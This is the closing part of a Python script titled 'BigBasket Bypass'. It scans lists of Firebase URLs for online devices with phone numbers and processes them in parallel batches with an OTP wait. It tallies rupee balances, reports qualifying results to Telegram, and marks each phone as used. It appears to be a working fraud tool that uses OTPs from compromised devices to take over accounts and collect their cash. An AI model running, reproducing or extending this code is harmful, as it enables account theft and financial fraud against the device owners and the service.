    for bs in range(0, total, DEVICES_PARALLEL):
        if SHUTDOWN_REQUESTED.is_set(): break
        batch = devices_list[bs:bs+DEVICES_PARALLEL]
        be = bs + len(batch)
        log(f"\n{C.head('🔥' * 25)}")
        log(f"{C.head(f'BATCH {bs+1}-{be}/{total}')} → {len(batch)} devices parallel")
        log(f"{C.head('🔥' * 25)}")
        tasks = []
        for i, (did, dinfo) in enumerate(batch):
            dn = bs + i + 1
            tasks.append(asyncio.create_task(
                process_device_all_phones(did, dinfo, fb_url, dn, total)))
        for r in await asyncio.gather(*tasks, return_exceptions=True):
            if isinstance(r, Exception):
                logger.error(f"batch err: {r}"); continue
            if r: all_results.extend(r)
    return all_results


# ============================================================
# MAIN FLOW
# ============================================================
def print_banner():
    log(f"{C.MAGENTA}{C.BOLD}\n  BigBasket Bypass — BACKGROUND WORKER\n{C.RESET}")


def _fmt_scan_row(idx, url, s):
    short = url.replace("https://","").replace("http://","")
    if len(short) > 58: short = short[:55]+"..."
    is_ = f"{C.YELLOW}{idx:<4}{C.RESET}"
    us = f"{C.dev(short):<58}"
    if isinstance(s, Exception):
        return f"{is_} {us} {C.err('ERR')}"
    if s["status"] != FBStatus.SUCCESS:
        return f"{is_} {us} {C.err(f'[{s["status"]}]')}"
    return (f"{is_} {us} online={C.ok(str(s['online']))} "
            f"offline={C.dim(str(s['offline']))} total={C.money(str(s['total']))} "
            f"{C.GREEN}✔{C.RESET}")


async def scan_all_streaming(urls):
    log("\n" + C.head("=" * 100))
    results = [None] * len(urls)
    sem = asyncio.Semaphore(FB_SCAN_CONCURRENCY)
    async def _b(i, u):
        async with sem:
            try: r = await scan_firebase_summary(u)
            except Exception as e: r = e
            return i, r
    tasks = [asyncio.create_task(_b(i, u)) for i, u in enumerate(urls)]
    t0 = time.time()
    for t in tasks:
        i, r = await t
        results[i] = r
        log(_fmt_scan_row(i+1, urls[i], r))
    log(C.head("=" * 100))
    log(f"{C.dim(f'⚡ Scanned {len(urls)} firebase(s) in {time.time()-t0:.2f}s')}")
    return results


async def process_firebase(fb_url, tag_label=""):
    label = f"{C.YELLOW}[{tag_label}]{C.RESET} {C.dev(fb_url)}" if tag_label else C.dev(fb_url)
    log(f"\n{C.info('🔎 Fetching')} {label}...")
    t0 = time.time()
    online = await get_online_devices(fb_url)
    if not online:
        log(C.err("❌ No online devices.")); return None

    dwp = {cid: i for cid, i in online.items() if i.get("phones")}
    fresh_cnt = 0
    for cid, info in dwp.items():
        for p in info["phones"]:
            if not USED.is_used(cid, p): fresh_cnt += 1

    log(f"   {C.head('📊')} {C.dim(f'({time.time()-t0:.2f}s)')} "
        f"online={C.BOLD}{len(online)}{C.RESET} "
        f"with_phones={C.BOLD}{len(dwp)}{C.RESET} "
        f"fresh={C.ok(str(fresh_cnt))}")

    if not dwp or fresh_cnt == 0:
        log(f"   {C.dim('   → skip (no fresh)')}")
        return {"fresh": 0, "success": 0, "failed": 0, "cash": 0, "sent": 0}

    log(f"   {C.warn(f'🚀 {fresh_cnt} fresh | OTP wait={OTP_WAIT_SECONDS}s | parallel={DEVICES_PARALLEL}')}")

    dl = list(dwp.items())
    t_s = time.time()
    results = await _process_devices_in_batches(dl, fb_url)

    success = failed = total_cash = sent = 0
    for r in results:
        if r and r.get("success"):
            success += 1
            t = r.get("total", 0)
            total_cash += t
            if t >= MIN_BALANCE_TO_SEND: sent += 1
        else: failed += 1

    log(f"\n   {C.head('🏁 DONE')} {C.ok('✓'+str(success))} "
        f"{C.err('✗'+str(failed))} "
        f"{C.head('TG='+str(sent))} "
        f"{C.money('₹'+str(total_cash))} "
        f"{C.dim(f'({time.time()-t_s:.1f}s)')}")

    return {"fresh": fresh_cnt, "success": success, "failed": failed,
            "cash": total_cash, "sent": sent}


async def process_multiple_firebases(urls):
    t_all = time.time()
    grand = {"success": 0, "failed": 0, "cash": 0, "sent": 0}
    total = len(urls)

    for i, u in enumerate(urls, 1):
        if SHUTDOWN_REQUESTED.is_set():
            log(C.warn(f"\n⚠️  Shutdown — stopped at {i}/{total}"))
            break

        log("\n" + C.head("━" * 78))
        log(f"{C.head(C.BOLD + f'🔥 FIREBASE {i}/{total}' + C.RESET)} "
            f"{C.dim(f'({total-i} remaining)')}")
        log(C.head("━" * 78))
        try:
            r = await process_firebase(u, tag_label=f"{i}/{total}")
        except Exception as e:
            logger.error(f"process_firebase err: {e}")
            r = None
        if r:
            grand["success"] += r.get("success", 0)
            grand["failed"] += r.get("failed", 0)
            grand["cash"] += r.get("cash", 0)
            grand["sent"] += r.get("sent", 0)
        log(f"\n   {C.dim('── PROGRESS ──')} {C.BOLD}{i}/{total}{C.RESET} | "
            f"{C.ok('✓'+str(grand['success']))} {C.err('✗'+str(grand['failed']))} | "
            f"{C.head('TG='+str(grand['sent']))} | "
            f"{C.money('₹'+str(grand['cash']))} | "
            f"{C.dim(f'{time.time()-t_all:.0f}s')}")

    log("\n" + C.head("█" * 78))
    log(C.head(C.BOLD + f"🏆 TOTAL — {len(urls)} FIREBASE(S)" + C.RESET))
    log(C.head("█" * 78))
    log(f"   {C.ok('✅ Success    :')} {C.BOLD}{grand['success']}{C.RESET}")
    log(f"   {C.err('❌ Failed     :')} {C.BOLD}{grand['failed']}{C.RESET}")
    log(f"   {C.head('📤 Sent to TG :')} {C.BOLD}{grand['sent']}{C.RESET}")
    log(f"   {C.head('💰 Total Cash :')} {C.money('₹'+str(grand['cash']))}")
    log(f"   {C.head('💾 used.json  :')} {C.BOLD}{USED.count()}{C.RESET}")
    log(f"   {C.dim('⏱  Time      :')} {C.dim(f'{time.time()-t_all:.2f}s')}")
    log(C.head("█" * 78))


async def auto_run_once():
    urls = load_firebase_urls()
    if not urls:
        log(C.err(f"❌ No URLs in {FIREBASE_FILE}")); return False
    norm = [n for n in (normalize_fb_url(u) for u in urls) if n]
    if not norm:
        log(C.err("❌ No valid URLs")); return False
    log(f"\n{C.info('📡 Scanning')} {C.BOLD}{len(norm)}{C.RESET} firebase(s)...")
    await scan_all_streaming(norm)
    log(f"\n{C.ok('✅ Auto-selected ALL')} {C.BOLD}{len(norm)}{C.RESET}")
    await process_multiple_firebases(norm)
    return True


# ============================================================
# SIGNAL HANDLERS
# ============================================================
_shutdown_started = False

def _signal_handler(signum, frame):
    global _shutdown_started
    if _shutdown_started:
        log(C.err(f"\n❌ 2nd signal {signum} — FORCE EXIT"))
        os._exit(1)
    _shutdown_started = True
    log(C.warn(f"\n⚠️  SIGNAL {signum} — graceful shutdown"))
    log(C.warn(f"   → saving ({USED.count()} records)"))
    SHUTDOWN_REQUESTED.set()
    try: USED.save()
    except Exception: pass

    def _force():
        time.sleep(SIGTERM_GRACE_SECONDS)
        log(C.err(f"\n💀 grace over — exit"))
        try: USED.save()
        except Exception: pass
        os._exit(0)
    threading.Thread(target=_force, daemon=True).start()


def main():
    signal.signal(signal.SIGTERM, _signal_handler)
    signal.signal(signal.SIGINT, _signal_handler)

    print_banner()
    log(f"{C.head('⚙️  CONFIG')}")
    log(f"   Used file:        {USED_FILE} ({USED.count()} records)")
    log(f"   Devices parallel: {DEVICES_PARALLEL}")
    log(f"   OTP wait:         {OTP_WAIT_SECONDS}s (fast-skip {OTP_FAST_SKIP_AFTER}s)")
    log(f"   tls_client:       {'✅' if HAS_TLS else '❌ (requests)'}")

    log(f"\n{C.ok('✅ Starting main loop')}")

    while not SHUTDOWN_REQUESTED.is_set():
        try:
            asyncio.run(auto_run_once())
        except KeyboardInterrupt:
            log(C.warn("\n👋 KeyboardInterrupt")); break
        except SystemExit: raise
        except Exception as e:
            logger.error(f"main crash: {e}")
            time.sleep(3)
        if AUTO_RERUN_DELAY <= 0: break
        log(f"\n{C.info(f'🔁 Sleep {AUTO_RERUN_DELAY}s...')}")
        try:
            for _ in range(AUTO_RERUN_DELAY):
                if SHUTDOWN_REQUESTED.is_set(): break
                time.sleep(1)
        except KeyboardInterrupt: break

    log(C.warn(f"\n👋 Final save — {USED.count()} records"))
    USED.save()


if __name__ == "__main__":
    try: main()
    except KeyboardInterrupt:
        print("\n👋")
        try: USED.save()
        except Exception: pass